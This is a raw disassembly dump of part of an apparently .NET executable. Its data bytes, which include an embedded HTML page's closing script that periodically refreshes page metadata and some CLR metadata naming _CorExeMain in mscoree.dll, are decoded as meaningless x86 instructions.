  407a35:	6c                   	insb   (%dx),%es:(%edi)
  407a36:	00 61 00             	add    %ah,0x0(%ecx)
  407a39:	73 00                	jae    0x407a3b
  407a3b:	73 00                	jae    0x407a3d
  407a3d:	4e                   	dec    %esi
  407a3e:	00 61 00             	add    %ah,0x0(%ecx)
  407a41:	6d                   	insl   (%dx),%es:(%edi)
  407a42:	00 65 00             	add    %ah,0x0(%ebp)
  407a45:	3d 00 27 00 62       	cmp    $0x62002700,%eax
  407a4a:	00 61 00             	add    %ah,0x0(%ecx)
  407a4d:	64 00 27             	add    %ah,%fs:(%edi)
  407a50:	00 3b                	add    %bh,(%ebx)
  407a52:	00 20                	add    %ah,(%eax)
  407a54:	00 7d 00             	add    %bh,0x0(%ebp)
  407a57:	29 00                	sub    %eax,(%eax)
  407a59:	3b 00                	cmp    (%eax),%eax
  407a5b:	0a 00                	or     (%eax),%al
  407a5d:	20 00                	and    %al,(%eax)
  407a5f:	20 00                	and    %al,(%eax)
  407a61:	7d 00                	jge    0x407a63
  407a63:	0a 00                	or     (%eax),%al
  407a65:	0a 00                	or     (%eax),%al
  407a67:	20 00                	and    %al,(%eax)
  407a69:	20 00                	and    %al,(%eax)
  407a6b:	73 00                	jae    0x407a6d
  407a6d:	65 00 74 00 49       	add    %dh,%gs:0x49(%eax,%eax,1)
  407a72:	00 6e 00             	add    %ch,0x0(%esi)
  407a75:	74 00                	je     0x407a77
  407a77:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  407a7b:	76 00                	jbe    0x407a7d
  407a7d:	61                   	popa
  407a7e:	00 6c 00 28          	add    %ch,0x28(%eax,%eax,1)
  407a82:	00 72 00             	add    %dh,0x0(%edx)
  407a85:	65 00 66 00          	add    %ah,%gs:0x0(%esi)
  407a89:	72 00                	jb     0x407a8b
  407a8b:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  407a8f:	68 00 4d 00 65       	push   $0x65004d00
  407a94:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  407a98:	00 2c 00             	add    %ch,(%eax,%eax,1)
  407a9b:	20 00                	and    %al,(%eax)
  407a9d:	31 00                	xor    %eax,(%eax)
  407a9f:	30 00                	xor    %al,(%eax)
  407aa1:	30 00                	xor    %al,(%eax)
  407aa3:	30 00                	xor    %al,(%eax)
  407aa5:	29 00                	sub    %eax,(%eax)
  407aa7:	3b 00                	cmp    (%eax),%eax
  407aa9:	0a 00                	or     (%eax),%al
  407aab:	20 00                	and    %al,(%eax)
  407aad:	20 00                	and    %al,(%eax)
  407aaf:	72 00                	jb     0x407ab1
  407ab1:	65 00 66 00          	add    %ah,%gs:0x0(%esi)
  407ab5:	72 00                	jb     0x407ab7
  407ab7:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  407abb:	68 00 4d 00 65       	push   $0x65004d00
  407ac0:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  407ac4:	00 28                	add    %ch,(%eax)
  407ac6:	00 29                	add    %ch,(%ecx)
  407ac8:	00 3b                	add    %bh,(%ebx)
  407aca:	00 0a                	add    %cl,(%edx)
  407acc:	00 7d 00             	add    %bh,0x0(%ebp)
  407acf:	29 00                	sub    %eax,(%eax)
  407ad1:	28 00                	sub    %al,(%eax)
  407ad3:	29 00                	sub    %eax,(%eax)
  407ad5:	3b 00                	cmp    (%eax),%eax
  407ad7:	0a 00                	or     (%eax),%al
  407ad9:	3c 00                	cmp    $0x0,%al
  407adb:	2f                   	das
  407adc:	00 73 00             	add    %dh,0x0(%ebx)
  407adf:	63 00                	arpl   %eax,(%eax)
  407ae1:	72 00                	jb     0x407ae3
  407ae3:	69 00 70 00 74 00    	imul   $0x740070,(%eax),%eax
  407ae9:	3e 00 0a             	add    %cl,%ds:(%edx)
  407aec:	00 3c 00             	add    %bh,(%eax,%eax,1)
  407aef:	2f                   	das
  407af0:	00 62 00             	add    %ah,0x0(%edx)
  407af3:	6f                   	outsl  %ds:(%esi),(%dx)
  407af4:	00 64 00 79          	add    %ah,0x79(%eax,%eax,1)
  407af8:	00 3e                	add    %bh,(%esi)
  407afa:	00 0a                	add    %cl,(%edx)
  407afc:	00 3c 00             	add    %bh,(%eax,%eax,1)
  407aff:	2f                   	das
  407b00:	00 68 00             	add    %ch,0x0(%eax)
  407b03:	74 00                	je     0x407b05
  407b05:	6d                   	insl   (%dx),%es:(%edi)
  407b06:	00 6c 00 3e          	add    %ch,0x3e(%eax,%eax,1)
  407b0a:	00 01                	add    %al,(%ecx)
  407b0c:	7d a7                	jge    0x407ab5
  407b0e:	c7                   	(bad)
  407b0f:	1a a7 7b ae 49 a9    	sbb    -0x56b65185(%edi),%ah
  407b15:	86 ae 4e 4f ac 27    	xchg   %ch,0x27ac4f4e(%esi)
  407b1b:	5d                   	pop    %ebp
  407b1c:	00 08                	add    %cl,(%eax)
  407b1e:	b7 7a                	mov    $0x7a,%bh
  407b20:	5c                   	pop    %esp
  407b21:	56                   	push   %esi
  407b22:	19 34 e0             	sbb    %esi,(%eax,%eiz,8)
  407b25:	89 04 06             	mov    %eax,(%esi,%eax,1)
  407b28:	1f                   	pop    %ds
  407b29:	11 02                	adc    %eax,(%edx)
  407b2b:	02 06                	add    (%esi),%al
  407b2d:	1c 02                	sbb    $0x2,%al
  407b2f:	06                   	push   %es
  407b30:	0e                   	push   %cs
  407b31:	02 06                	add    (%esi),%al
  407b33:	08 02                	or     %al,(%edx)
  407b35:	06                   	push   %es
  407b36:	0a 02                	or     (%edx),%al
  407b38:	06                   	push   %es
  407b39:	18 03                	sbb    %al,(%ebx)
  407b3b:	06                   	push   %es
  407b3c:	11 14 03             	adc    %edx,(%ebx,%eax,1)
  407b3f:	06                   	push   %es
  407b40:	1d 05 02 06 0d       	sbb    $0xd060205,%eax
  407b45:	08 b0 3f 5f 7f 11    	or     %dh,0x117f5f3f(%eax)
  407b4b:	d5 0a                	aad    $0xa
  407b4d:	3a 03                	cmp    (%ebx),%al
  407b4f:	06                   	push   %es
  407b50:	12 15 05 00 01 01    	adc    0x1010005,%dl
  407b56:	1d 0e 03 00 00       	sbb    $0x30e,%eax
  407b5b:	01 05 00 01 01 12    	add    %eax,0x12010100
  407b61:	19 04 00             	sbb    %eax,(%eax,%eax,1)
  407b64:	01 01                	add    %eax,(%ecx)
  407b66:	0e                   	push   %cs
  407b67:	03 00                	add    (%eax),%eax
  407b69:	00 0e                	add    %cl,(%esi)
  407b6b:	05 00 02 08 08       	add    $0x8080200,%eax
  407b70:	08 07                	or     %al,(%edi)
  407b72:	00 02                	add    %al,(%edx)
  407b74:	1d 05 12 1d 0a       	sbb    $0xa1d1205,%eax
  407b79:	04 00                	add    $0x0,%al
  407b7b:	00 12                	add    %dl,(%edx)
  407b7d:	15 05 00 02 0e       	adc    $0xe020005,%eax
  407b82:	0e                   	push   %cs
  407b83:	0e                   	push   %cs
  407b84:	06                   	push   %es
  407b85:	00 03                	add    %al,(%ebx)
  407b87:	08 0e                	or     %cl,(%esi)
  407b89:	0e                   	push   %cs
  407b8a:	08 04 00             	or     %al,(%eax,%eax,1)
  407b8d:	01 0e                	add    %ecx,(%esi)
  407b8f:	0e                   	push   %cs
  407b90:	03 20                	add    (%eax),%esp
  407b92:	00 01                	add    %al,(%ecx)
  407b94:	04 01                	add    $0x1,%al
  407b96:	00 00                	add    %al,(%eax)
  407b98:	00 04 02             	add    %al,(%edx,%eax,1)
  407b9b:	00 00                	add    %al,(%eax)
  407b9d:	00 04 04             	add    %al,(%esp,%eax,1)
  407ba0:	00 00                	add    %al,(%eax)
  407ba2:	00 04 08             	add    %al,(%eax,%ecx,1)
  407ba5:	00 00                	add    %al,(%eax)
  407ba7:	00 04 10             	add    %al,(%eax,%edx,1)
  407baa:	00 00                	add    %al,(%eax)
  407bac:	00 04 20             	add    %al,(%eax,%eiz,1)
  407baf:	00 00                	add    %al,(%eax)
  407bb1:	00 04 40             	add    %al,(%eax,%eax,2)
  407bb4:	00 00                	add    %al,(%eax)
  407bb6:	00 04 80             	add    %al,(%eax,%eax,4)
  407bb9:	00 00                	add    %al,(%eax)
  407bbb:	00 04 00             	add    %al,(%eax,%eax,1)
  407bbe:	01 00                	add    %eax,(%eax)
  407bc0:	00 04 00             	add    %al,(%eax,%eax,1)
  407bc3:	02 00                	add    (%eax),%al
  407bc5:	00 04 01             	add    %al,(%ecx,%eax,1)
  407bc8:	02 00                	add    (%eax),%al
  407bca:	00 04 02             	add    %al,(%edx,%eax,1)
  407bcd:	02 00                	add    (%eax),%al
  407bcf:	00 04 04             	add    %al,(%esp,%eax,1)
  407bd2:	02 00                	add    (%eax),%al
  407bd4:	00 04 05 02 00 00 04 	add    %al,0x4000002(,%eax,1)
  407bdb:	0a 02                	or     (%edx),%al
  407bdd:	00 00                	add    %al,(%eax)
  407bdf:	04 01                	add    $0x1,%al
  407be1:	01 00                	add    %eax,(%eax)
  407be3:	00 04 02             	add    %al,(%edx,%eax,1)
  407be6:	01 00                	add    %eax,(%eax)
  407be8:	00 07                	add    %al,(%edi)
  407bea:	00 04 18             	add    %al,(%eax,%ebx,1)
  407bed:	0e                   	push   %cs
  407bee:	09 02                	or     %eax,(%edx)
  407bf0:	08 04 00             	or     %al,(%eax,%eax,1)
  407bf3:	01 02                	add    %eax,(%edx)
  407bf5:	18 07                	sbb    %al,(%edi)
  407bf7:	00 03                	add    %al,(%ebx)
  407bf9:	02 18                	add    (%eax),%bl
  407bfb:	12 18                	adc    (%eax),%bl
  407bfd:	18 07                	sbb    %al,(%edi)
  407bff:	00 02                	add    %al,(%edx)
  407c01:	02 18                	add    (%eax),%bl
  407c03:	10 11                	adc    %dl,(%ecx)
  407c05:	14 07                	adc    $0x7,%al
  407c07:	00 03                	add    %al,(%ebx)
  407c09:	08 18                	or     %bl,(%eax)
  407c0b:	12 21                	adc    (%ecx),%ah
  407c0d:	08 06                	or     %al,(%esi)
  407c0f:	00 03                	add    %al,(%ebx)
  407c11:	02 18                	add    (%eax),%bl
  407c13:	18 08                	sbb    %cl,(%eax)
  407c15:	07                   	pop    %es
  407c16:	00 04 02             	add    %al,(%edx,%eax,1)
  407c19:	18 08                	sbb    %cl,(%eax)
  407c1b:	18 18                	sbb    %bl,(%eax)
  407c1d:	05 20 02 01 1c       	add    $0x1c010220,%eax
  407c22:	18 05 20 02 02 18    	sbb    %al,0x18020220
  407c28:	18 09                	sbb    %cl,(%ecx)
  407c2a:	20 04 12             	and    %al,(%edx,%edx,1)
  407c2d:	25 18 18 12 29       	and    $0x29121818,%eax
  407c32:	1c 05                	sbb    $0x5,%al
  407c34:	20 01                	and    %al,(%ecx)
  407c36:	02 12                	add    (%edx),%dl
  407c38:	25 05 20 01 01       	and    $0x1012005,%eax
  407c3d:	11 31                	adc    %esi,(%ecx)
  407c3f:	01 02                	add    %eax,(%edx)
  407c41:	04 20                	add    $0x20,%al
  407c43:	01 01                	add    %eax,(%ecx)
  407c45:	08 06                	or     %al,(%esi)
  407c47:	00 02                	add    %al,(%edx)
  407c49:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  407c4c:	41                   	inc    %ecx
  407c4d:	03 06                	add    (%esi),%eax
  407c4f:	12 45 04             	adc    0x4(%ebp),%al
  407c52:	20 01                	and    %al,(%ecx)
  407c54:	01 02                	add    %eax,(%edx)
  407c56:	05 00 01 01 12       	add    $0x12010100,%eax
  407c5b:	45                   	inc    %ebp
  407c5c:	06                   	push   %es
  407c5d:	00 02                	add    %al,(%edx)
  407c5f:	01 0e                	add    %ecx,(%esi)
  407c61:	1d 1c 05 20 01       	sbb    $0x120051c,%eax
  407c66:	01 12                	add    %edx,(%edx)
  407c68:	59                   	pop    %ecx
  407c69:	04 20                	add    $0x20,%al
  407c6b:	01 01                	add    %eax,(%ecx)
  407c6d:	0e                   	push   %cs
  407c6e:	04 20                	add    $0x20,%al
  407c70:	01 02                	add    %eax,(%edx)
  407c72:	08 06                	or     %al,(%esi)
  407c74:	07                   	pop    %es
  407c75:	02 12                	add    (%edx),%dl
  407c77:	5d                   	pop    %ebp
  407c78:	1d 1c 05 00 02       	sbb    $0x200051c,%eax
  407c7d:	02 0e                	add    (%esi),%cl
  407c7f:	0e                   	push   %cs
  407c80:	06                   	push   %es
  407c81:	00 02                	add    %al,(%edx)
  407c83:	02 0e                	add    (%esi),%cl
  407c85:	10 08                	adc    %cl,(%eax)
  407c87:	09 07                	or     %eax,(%edi)
  407c89:	07                   	pop    %es
  407c8a:	08 0e                	or     %cl,(%esi)
  407c8c:	0e                   	push   %cs
  407c8d:	08 08                	or     %cl,(%eax)
  407c8f:	08 02                	or     %al,(%edx)
  407c91:	05 00 02 02 18       	add    $0x18020200,%eax
  407c96:	18 03                	sbb    %al,(%ebx)
  407c98:	00 00                	add    %al,(%eax)
  407c9a:	08 05 00 02 01 0e    	or     %al,0xe010200
  407ca0:	1c 03                	sbb    $0x3,%al
  407ca2:	06                   	push   %es
  407ca3:	11 6d 04             	adc    %ebp,0x4(%ebp)
  407ca6:	00 00                	add    %al,(%eax)
  407ca8:	11 6d 08             	adc    %ebp,0x8(%ebp)
  407cab:	00 02                	add    %al,(%edx)
  407cad:	11 71 11             	adc    %esi,0x11(%ecx)
  407cb0:	6d                   	insl   (%dx),%es:(%edi)
  407cb1:	11 6d 03             	adc    %ebp,0x3(%ebp)
  407cb4:	20 00                	and    %al,(%eax)
  407cb6:	0d 06 00 02 01       	or     $0x1020006,%eax
  407cbb:	1c 10                	sbb    $0x10,%al
  407cbd:	02 04 00             	add    (%eax,%eax,1),%al
  407cc0:	01 01                	add    %eax,(%ecx)
  407cc2:	1c 04                	sbb    $0x4,%al
  407cc4:	00 01                	add    %al,(%ecx)
  407cc6:	01 08                	add    %ecx,(%eax)
  407cc8:	03 20                	add    (%eax),%esp
  407cca:	00 08                	add    %cl,(%eax)
  407ccc:	07                   	pop    %es
  407ccd:	20 03                	and    %al,(%ebx)
  407ccf:	01 08                	add    %ecx,(%eax)
  407cd1:	08 11                	or     %dl,(%ecx)
  407cd3:	7d 07                	jge    0x407cdc
  407cd5:	00 01                	add    %al,(%ecx)
  407cd7:	12 80 81 12 79 03    	adc    0x3791281(%eax),%al
  407cdd:	20 00                	and    %al,(%eax)
  407cdf:	18 04 20             	sbb    %al,(%eax,%eiz,1)
  407ce2:	01 01                	add    %eax,(%ecx)
  407ce4:	18 03                	sbb    %al,(%ebx)
  407ce6:	20 00                	and    %al,(%eax)
  407ce8:	0e                   	push   %cs
  407ce9:	23 07                	and    (%edi),%eax
  407ceb:	16                   	push   %ss
  407cec:	11 6d 12             	adc    %ebp,0x12(%ebp)
  407cef:	1d 0a 11 6d 18       	sbb    $0x186d110a,%eax
  407cf4:	11 14 08             	adc    %edx,(%eax,%ecx,1)
  407cf7:	08 02                	or     %al,(%edx)
  407cf9:	02 12                	add    (%edx),%dl
  407cfb:	80 81 18 1d 05 02 11 	addb   $0x11,0x2051d18(%ecx)
  407d02:	71 02                	jno    0x407d06
  407d04:	08 02                	or     %al,(%edx)
  407d06:	12 80 8d 02 11 71    	adc    0x7111028d(%eax),%al
  407d0c:	1c 08                	sbb    $0x8,%al
  407d0e:	06                   	push   %es
  407d0f:	15 12 80 91 01       	adc    $0x1918012,%eax
  407d14:	12 0c 07             	adc    (%edi,%eax,1),%cl
  407d17:	15 12 80 91 01       	adc    $0x1918012,%eax
  407d1c:	12 0c 05 20 01 01 13 	adc    0x13010120(,%eax,1),%cl
  407d23:	00 0d 07 08 11 14    	add    %cl,0x14110807
  407d29:	08 08                	or     %cl,(%eax)
  407d2b:	12 21                	adc    (%ecx),%ah
  407d2d:	0e                   	push   %cs
  407d2e:	12 0c 02             	adc    (%edx,%eax,1),%cl
  407d31:	02 09                	add    (%ecx),%cl
  407d33:	20 00                	and    %al,(%eax)
  407d35:	15 11 80 95 01       	adc    $0x1958011,%eax
  407d3a:	13 00                	adc    (%eax),%eax
  407d3c:	07                   	pop    %es
  407d3d:	15 11 80 95 01       	adc    $0x1958011,%eax
  407d42:	12 0c 04             	adc    (%esp,%eax,1),%cl
  407d45:	20 00                	and    %al,(%eax)
  407d47:	13 00                	adc    (%eax),%eax
  407d49:	03 20                	add    (%eax),%esp
  407d4b:	00 02                	add    %al,(%edx)
  407d4d:	12 07                	adc    (%edi),%al
  407d4f:	07                   	pop    %es
  407d50:	12 0c 12             	adc    (%edx,%edx,1),%cl
  407d53:	0c 02                	or     $0x2,%al
  407d55:	12 1c 02             	adc    (%edx,%eax,1),%bl
  407d58:	15 11 80 95 01       	adc    $0x1958011,%eax
  407d5d:	12 0c 1c             	adc    (%esp,%ebx,1),%cl
  407d60:	03 06                	add    (%esi),%eax
  407d62:	12 19                	adc    (%ecx),%bl
  407d64:	04 20                	add    $0x20,%al
  407d66:	01 01                	add    %eax,(%ecx)
  407d68:	1c 05                	sbb    $0x5,%al
  407d6a:	20 00                	and    %al,(%eax)
  407d6c:	12 80 9d 06 00 03    	adc    0x300069d(%eax),%al
  407d72:	0e                   	push   %cs
  407d73:	1c 1c                	sbb    $0x1c,%al
  407d75:	1c 04                	sbb    $0x4,%al
  407d77:	20 00                	and    %al,(%eax)
  407d79:	12 19                	adc    (%ecx),%bl
  407d7b:	06                   	push   %es
  407d7c:	00 01                	add    %al,(%ecx)
  407d7e:	02 12                	add    (%edx),%dl
  407d80:	80 a1 08 07 03 12 80 	andb   $0x80,0x12030708(%ecx)
  407d87:	99                   	cltd
  407d88:	12 20                	adc    (%eax),%ah
  407d8a:	02 05 20 00 12 80    	add    0x80120020,%al
  407d90:	b1 05                	mov    $0x5,%cl
  407d92:	20 00                	and    %al,(%eax)
  407d94:	12 80 b5 05 00 00    	adc    0x5b5(%eax),%al
  407d9a:	12 80 b9 05 20 01    	adc    0x12005b9(%eax),%al
  407da0:	1d 05 0e 05 20       	sbb    $0x20050e05,%eax
  407da5:	00 12                	add    %dl,(%edx)
  407da7:	80 bd 04 20 01 01 0a 	cmpb   $0xa,0x1012004(%ebp)
  407dae:	05 20 00 12 80       	add    $0x80120020,%eax
  407db3:	c1 07 20             	roll   $0x20,(%edi)
  407db6:	03 01                	add    (%ecx),%eax
  407db8:	1d 05 08 08 05       	sbb    $0x5080805,%eax
  407dbd:	20 00                	and    %al,(%eax)
  407dbf:	12 80 b9 09 20 02    	adc    0x22009b9(%eax),%al
  407dc5:	01 12                	add    %edx,(%edx)
  407dc7:	80 c1 12             	add    $0x12,%cl
  407dca:	80 b9 0e 07 07 0e 1d 	cmpb   $0x1d,0xe07070e(%ecx)
  407dd1:	05 12 80 c5 0e       	add    $0xec58012,%eax
  407dd6:	1d 05 1d 05 02       	sbb    $0x2051d05,%eax
  407ddb:	05 20 00 12 80       	add    $0x80120020,%eax
  407de0:	cd 05                	int    $0x5
  407de2:	20 02                	and    %al,(%edx)
  407de4:	01 0e                	add    %ecx,(%esi)
  407de6:	0e                   	push   %cs
  407de7:	05 00 02 02 1c       	add    $0x1c020200,%eax
  407dec:	1c 04                	sbb    $0x4,%al
  407dee:	20 01                	and    %al,(%ecx)
  407df0:	01 05 12 07 09 12    	add    %eax,0x12090712
  407df6:	80 bd 12 80 c1 1d 05 	cmpb   $0x5,0x1dc18012(%ebp)
  407dfd:	1d 05 0e 1d 05       	sbb    $0x51d0e05,%eax
  407e02:	02 1c 02             	add    (%edx,%eax,1),%bl
  407e05:	04 00                	add    $0x0,%al
  407e07:	01 02                	add    %eax,(%edx)
  407e09:	0e                   	push   %cs
  407e0a:	08 06                	or     %al,(%esi)
  407e0c:	15 12 80 d5 02       	adc    $0x2d58012,%eax
  407e11:	0e                   	push   %cs
  407e12:	08 07                	or     %al,(%edi)
  407e14:	15 12 80 d5 02       	adc    $0x2d58012,%eax
  407e19:	0e                   	push   %cs
  407e1a:	08 07                	or     %al,(%edi)
  407e1c:	20 02                	and    %al,(%edx)
  407e1e:	01 13                	add    %edx,(%ebx)
  407e20:	00 13                	add    %dl,(%ebx)
  407e22:	01 08                	add    %ecx,(%eax)
  407e24:	20 02                	and    %al,(%edx)
  407e26:	02 13                	add    (%ebx),%dl
  407e28:	00 10                	add    %dl,(%eax)
  407e2a:	13 01                	adc    (%ecx),%eax
  407e2c:	04 20                	add    $0x20,%al
  407e2e:	01 03                	add    %eax,(%ebx)
  407e30:	08 18                	or     %bl,(%eax)
  407e32:	07                   	pop    %es
  407e33:	15 0e 18 11 14       	adc    $0x1411180e,%eax
  407e38:	08 08                	or     %cl,(%eax)
  407e3a:	0e                   	push   %cs
  407e3b:	08 08                	or     %cl,(%eax)
  407e3d:	08 08                	or     %cl,(%eax)
  407e3f:	08 08                	or     %cl,(%eax)
  407e41:	08 08                	or     %cl,(%eax)
  407e43:	08 0e                	or     %cl,(%esi)
  407e45:	02 02                	add    (%edx),%al
  407e47:	1c 0e                	sbb    $0xe,%al
  407e49:	08 0c 07             	or     %cl,(%edi,%eax,1)
  407e4c:	07                   	pop    %es
  407e4d:	11 14 12             	adc    %edx,(%edx,%edx,1)
  407e50:	21 08                	and    %ecx,(%eax)
  407e52:	08 12                	or     %dl,(%edx)
  407e54:	0c 02                	or     $0x2,%al
  407e56:	02 05 20 01 12 21    	add    0x21120120,%al
  407e5c:	0e                   	push   %cs
  407e5d:	04 20                	add    $0x20,%al
  407e5f:	01 0e                	add    %ecx,(%esi)
  407e61:	0e                   	push   %cs
  407e62:	05 20 01 12 21       	add    $0x21120120,%eax
  407e67:	08 05 00 00 12 80    	or     %al,0x80120000
  407e6d:	d9 07                	flds   (%edi)
  407e6f:	20 02                	and    %al,(%edx)
  407e71:	0e                   	push   %cs
  407e72:	0e                   	push   %cs
  407e73:	12 80 e1 05 20 01    	adc    0x12005e1(%eax),%al
  407e79:	13 00                	adc    (%eax),%eax
  407e7b:	08 16                	or     %dl,(%esi)
  407e7d:	07                   	pop    %es
  407e7e:	10 18                	adc    %bl,(%eax)
  407e80:	0e                   	push   %cs
  407e81:	08 08                	or     %cl,(%eax)
  407e83:	0d 12 21 08 12       	or     $0x12082112,%eax
  407e88:	0c 08                	or     $0x8,%al
  407e8a:	08 02                	or     %al,(%edx)
  407e8c:	12 18                	adc    (%eax),%bl
  407e8e:	12 28                	adc    (%eax),%ch
  407e90:	0e                   	push   %cs
  407e91:	02 1c 03             	add    (%ebx,%eax,1),%bl
  407e94:	07                   	pop    %es
  407e95:	01 08                	add    %ecx,(%eax)
  407e97:	06                   	push   %es
  407e98:	20 00                	and    %al,(%eax)
  407e9a:	1d 12 80 ed 04       	sbb    $0x4ed8012,%eax
  407e9f:	06                   	push   %es
  407ea0:	12 80 f1 07 20 02    	adc    0x22007f1(%eax),%al
  407ea6:	01 12                	add    %edx,(%edx)
  407ea8:	80 f1 0a             	xor    $0xa,%cl
  407eab:	0b 20                	or     (%eax),%esp
  407ead:	03 01                	add    (%ecx),%eax
  407eaf:	12 80 c1 12 15 12    	adc    0x121512c1(%eax),%al
  407eb5:	80 e9 04             	sub    $0x4,%cl
  407eb8:	20 00                	and    %al,(%eax)
  407eba:	1d 05 0b 07 04       	sbb    $0x4070b05,%eax
  407ebf:	12 80 e5 12 80 e9    	adc    -0x167fed1b(%eax),%al
  407ec5:	1d 05 02 05 00       	sbb    $0x50205,%eax
  407eca:	00 1d 12 15 08 00    	add    %bl,0x81512
  407ed0:	03 02                	add    (%edx),%eax
  407ed2:	0e                   	push   %cs
  407ed3:	0e                   	push   %cs
  407ed4:	11 80 f5 0e 07 06    	adc    %eax,0x6070ef5(%eax)
  407eda:	1d 12 15 12 15       	sbb    $0x15121512,%eax
  407edf:	12 15 1d 12 15 08    	adc    0x815121d,%dl
  407ee5:	02 06                	add    (%esi),%al
  407ee7:	00 03                	add    %al,(%ebx)
  407ee9:	0e                   	push   %cs
  407eea:	0e                   	push   %cs
  407eeb:	0e                   	push   %cs
  407eec:	0e                   	push   %cs
  407eed:	07                   	pop    %es
  407eee:	20 02                	and    %al,(%edx)
  407ef0:	08 0e                	or     %cl,(%esi)
  407ef2:	11 80 f5 05 20 02    	adc    %eax,0x22005f5(%eax)
  407ef8:	08 03                	or     %al,(%ebx)
  407efa:	08 04 00             	or     %al,(%eax,%eax,1)
  407efd:	01 02                	add    %eax,(%edx)
  407eff:	03 05 20 01 12 21    	add    0x21120120,%eax
  407f05:	03 0b                	add    (%ebx),%ecx
  407f07:	07                   	pop    %es
  407f08:	08 0e                	or     %cl,(%esi)
  407f0a:	08 12                	or     %dl,(%edx)
  407f0c:	21 02                	and    %eax,(%edx)
  407f0e:	03 0e                	add    (%esi),%ecx
  407f10:	02 03                	add    (%ebx),%al
  407f12:	05 20 02 0e 08       	add    $0x80e0220,%eax
  407f17:	08 0c 00             	or     %cl,(%eax,%eax,1)
  407f1a:	04 02                	add    $0x2,%al
  407f1c:	0e                   	push   %cs
  407f1d:	11 80 fd 12 80 e1    	adc    %eax,-0x1e7fed03(%eax)
  407f23:	10 0d 04 00 01 0d    	adc    %cl,0xd010004
  407f29:	0d 09 07 07 0e       	or     $0xe070709,%eax
  407f2e:	08 08                	or     %cl,(%eax)
  407f30:	08 0d 08 02 0b 07    	or     %cl,0x70b0208
  407f36:	08 12                	or     %dl,(%edx)
  407f38:	21 03                	and    %eax,(%ebx)
  407f3a:	0e                   	push   %cs
  407f3b:	02 0e                	add    (%esi),%cl
  407f3d:	08 03                	or     %al,(%ebx)
  407f3f:	08 06                	or     %al,(%esi)
  407f41:	20 01                	and    %al,(%ecx)
  407f43:	01 11                	add    %edx,(%ecx)
  407f45:	81 0d 08 01 00 08 00 	orl    $0x0,0x8000108
  407f4c:	00 00 00 
  407f4f:	00 1e                	add    %bl,(%esi)
  407f51:	01 00                	add    %eax,(%eax)
  407f53:	01 00                	add    %eax,(%eax)
  407f55:	54                   	push   %esp
  407f56:	02 16                	add    (%esi),%dl
  407f58:	57                   	push   %edi
  407f59:	72 61                	jb     0x407fbc
  407f5b:	70 4e                	jo     0x407fab
  407f5d:	6f                   	outsl  %ds:(%esi),(%dx)
  407f5e:	6e                   	outsb  %ds:(%esi),(%dx)
  407f5f:	45                   	inc    %ebp
  407f60:	78 63                	js     0x407fc5
  407f62:	65 70 74             	gs jo  0x407fd9
  407f65:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  407f6c:	77 73                	ja     0x407fe1
  407f6e:	01 00                	add    %eax,(%eax)
  407f70:	98                   	cwtl
  407f71:	7f 00                	jg     0x407f73
	...
  407f7b:	00 ae 7f 00 00 00    	add    %ch,0x7f(%esi)
  407f81:	20 00                	and    %al,(%eax)
	...
  407f97:	00 a0 7f 00 00 00    	add    %ah,0x7f(%eax)
  407f9d:	00 00                	add    %al,(%eax)
  407f9f:	00 00                	add    %al,(%eax)
  407fa1:	00 5f 43             	add    %bl,0x43(%edi)
  407fa4:	6f                   	outsl  %ds:(%esi),(%dx)
  407fa5:	72 45                	jb     0x407fec
  407fa7:	78 65                	js     0x40800e
  407fa9:	4d                   	dec    %ebp
  407faa:	61                   	popa
  407fab:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  407fb2:	72 65                	jb     0x408019
  407fb4:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  407fb8:	6c                   	insb   (%dx),%es:(%edi)
  407fb9:	00 00                	add    %al,(%eax)
  407fbb:	00 00                	add    %al,(%eax)
  407fbd:	00 ff                	add    %bh,%bh
  407fbf:	25 00 20 40 00       	and    $0x402000,%eax
